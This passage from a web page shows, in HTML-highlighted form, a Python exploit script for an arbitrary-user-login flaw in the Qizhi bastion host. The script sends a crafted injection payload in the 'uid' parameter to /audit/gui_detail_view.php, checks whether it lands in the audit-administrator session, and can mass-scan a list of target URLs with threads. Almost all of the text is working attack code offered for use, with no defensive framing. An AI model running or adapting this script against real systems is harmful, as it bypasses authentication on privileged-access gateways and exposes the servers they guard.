</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[----------------------------------------------------------]"</span>)</span><br><span class="line">    print(<span class="string">"[--------            齐治堡垒机任意用户登录            --------]"</span>)</span><br><span class="line">    print(<span class="string">"[--------            use: python3 qizhi.py         --------]"</span>)</span><br><span class="line">    print(<span class="string">"[--------              Author: Kat                 --------]"</span>)</span><br><span class="line">    print(<span class="string">"[----------------------------------------------------------]"</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">(funcname, filename=<span class="string">"url.txt"</span>, pools=<span class="number">5</span>)</span>:</span></span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">"\n"</span>)]</span><br><span class="line">            works.append((func_params, <span class="keyword">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(funcname, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    tar_url = url + <span class="string">'/audit/gui_detail_view.php'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded;charset=UTF-8"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">'token'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'id'</span>: <span class="string">'%5C'</span>,</span><br><span class="line">        <span class="string">'uid'</span>: <span class="string">'%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23'</span>,</span><br><span class="line">        <span class="string">'login'</span>: <span class="string">'shterm'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=tar_url, params=payload, headers=headers, verify=<span class="keyword">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        outprint = res.text.replace(<span class="string">'&lt;br&gt;'</span>, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"审计管理员"</span> <span class="keyword">in</span> outprint <span class="keyword">and</span> <span class="string">"事件审计"</span> <span class="keyword">in</span> outprint <span class="keyword">and</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">f"\033[31m[!]  目标系统: <span class="subst">&#123;url&#125;</span> 存在任意用户登录漏洞！"</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'result:auth failure'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">f"\033[31m[!]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在任意用户登录漏洞！"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">f"[0]  目标系统: <span class="subst">&#123;url&#125;</span> 出现异常！"</span>)</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> (len(sys.argv)) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'useage : python'</span> + str(sys.argv[<span class="number">0</span>]) + <span class="string">' -h'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">'-u'</span>, help=<span class="string">"url -&gt; example http://127.0.0.1"</span>, type=str, dest=<span class="string">'check_url'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-r'</span>, help=<span class="string">"url list to file"</span>, type=str, dest=<span class="string">'check_file'</span>)</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.check_url:</span><br><span class="line">            check(args.check_url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (args.check_file):</span><br><span class="line">            multithreading(check, args.check_file, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
